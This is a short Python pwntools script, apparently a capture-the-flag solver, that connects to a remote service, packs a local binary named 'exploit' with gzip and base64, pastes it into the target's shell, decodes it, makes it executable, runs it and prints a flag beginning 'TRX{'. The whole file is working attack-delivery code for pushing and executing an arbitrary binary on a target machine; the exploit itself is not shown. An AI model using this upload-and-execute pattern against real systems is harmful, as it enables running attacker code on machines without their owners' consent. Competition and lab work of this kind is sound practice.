#!/usr/bin/env python3

from pwn import *
import os
import sys

url = sys.argv[1].split(":")
io = remote(url[0], int(url[1]))

os.system("cat exploit | gzip | base64 > b64.txt")

with open("b64.txt", "r") as f:
    data = f.read()

io.sendlineafter(b"$ ", f'cd /home/user; echo "{data}" | base64 -d | gunzip > exploit; chmod +x exploit; ./exploit'.encode())

io.recvuntil(b"TRX{")
print("TRX{" + io.recvuntil(b"}").decode())
